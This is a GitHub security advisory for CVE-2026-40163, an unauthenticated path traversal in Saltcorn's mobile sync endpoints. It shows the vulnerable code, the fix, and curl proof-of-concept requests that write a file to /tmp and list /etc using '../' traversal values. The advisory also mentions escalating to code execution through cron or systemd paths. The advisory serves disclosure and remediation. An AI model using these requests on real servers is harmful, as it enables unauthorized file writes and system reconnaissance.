# [H] Saltcorn has an Unauthenticated Path Traversal in sync endpoints, allowing arbitrary file write and directory read

## Summary
Severity: High
Advisory: GHSA-32pv-mpqg-h292
CVE: CVE-2026-40163
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-32pv-mpqg-h292
Type: github-advisory

## Affected
- npm: `@saltcorn/server` — affected >=0 <1.4.5
- npm: `@saltcorn/server` — affected >=1.5.0-beta.0 <1.5.5
- npm: `@saltcorn/server` — affected >=1.6.0-alpha.0 <1.6.0-beta.4

## Details
### Summary

Two unauthenticated path traversal vulnerabilities exist in Saltcorn's mobile sync endpoints. The `POST /sync/offline_changes` endpoint allows an unauthenticated attacker to create arbitrary directories and write a `changes.json` file with attacker-controlled JSON content anywhere on the server filesystem. The `GET /sync/upload_finished` endpoint allows an unauthenticated attacker to list arbitrary directory contents and read specific JSON files.

The safe path validation function `File.normalise_in_base()` exists in the codebase and is correctly used by the `clean_sync_dir` endpoint in the **same file** (fix for GHSA-43f3-h63w-p6f6), but was not applied to these two endpoints.

### Details

**Finding 1: Arbitrary file write — `POST /sync/offline_changes` (sync.js line 226)**

The `newSyncTimestamp` parameter from the request body is used directly in `path.join()` without sanitization:

```javascript
const syncDirName = `${newSyncTimestamp}_${req.user?.email || "public"}`;
const syncDir = path.join(
    rootFolder.location, "mobile_app", "sync", syncDirName
);
await fs.mkdir(syncDir, { recursive: true });        // creates arbitrary dir
await fs.writeFile(
    path.join(syncDir, "changes.json"),
    JSON.stringify(changes)                           // writes attacker content
);
```

No authentication middleware is applied to this route. Since `path.join()` normalizes `../` sequences, setting `newSyncTimestamp` to `../../../../tmp/evil` causes the path to resolve outside the sync directory.

**Finding 2: Arbitrary directory read — `GET /sync/upload_finished` (sync.js line 288)**

The `dir_name` query parameter is used directly in `path.join()` without sanitization:

```javascript
const syncDir = path.join(
    rootFolder.location, "mobile_app", "sync", dir_name
);
let entries = await fs.readdir(syncDir);
```

Also unauthenticated. An attacker can list directory contents and read files named `translated-ids.json`, `unique-conflicts.json`, `data-conflicts.json`, or `error.json` from any directory.

**Contrast — fixed endpoint in the same file (line 342):**

The `clean_sync_dir` endpoint correctly uses `File.normalise_in_base()`:

```javascript
const syncDir = File.normalise_in_base(
    path.join(rootFolder.location, "mobile_app", "sync"),
    dir_name
);
if (syncDir) await fs.rm(syncDir, { recursive: true, force: true });
```

### PoC

```bash
# Write arbitrary file to /tmp/
curl -X POST http://TARGET:3000/sync/offline_changes \
  -H "Content-Type: application/json" \
  -d '{
    "newSyncTimestamp": "../../../../tmp/saltcorn_poc",
    "oldSyncTimestamp": "0",
    "changes": {"proof": "path_traversal_write"}
  }'
# Result: /tmp/saltcorn_poc_public/changes.json created with attacker content

# List /etc/ directory
curl "http://TARGET:3000/sync/upload_finished?dir_name=../../../../etc"
```

### Impact

- **Unauthenticated arbitrary directory creation** anywhere on the filesystem
- **Unauthenticated arbitrary JSON file write** (`changes.json`) to any writable directory
- **Unauthenticated directory listing** of arbitrary directories
- **Unauthenticated read** of specific JSON files from arbitrary directories
- Potential for **remote code execution** via writing to sensitive paths (cron, systemd, Node.js module paths)

### Remediation

Apply `File.normalise_in_base()` to both endpoints, matching the existing pattern in `clean_sync_dir`:

```javascript
// offline_changes fix
const syncDirName = `${newSyncTimestamp}_${req.user?.email || "public"}`;
const syncDir = File.normalise_in_base(
    path.join(rootFolder.location, "mobile_app", "sync"),
    syncDirName
);
if (!syncDir) {
    return res.status(400).json({ error: "Invalid sync directory name" });
}

// upload_finished fix
const syncDir = File.normalise_in_base(
    path.join(rootFolder.location, "mobile_app", "sync"),
    dir_name
);
if (!syncDir) {
    return res.json({ finished: false });
}
```

Additionally, add `loggedIn` middleware to endpoints that modify server state.

## References
- https://github.com/saltcorn/saltcorn/security/advisories/GHSA-32pv-mpqg-h292
- https://nvd.nist.gov/vuln/detail/CVE-2026-40163
- https://github.com/saltcorn/saltcorn
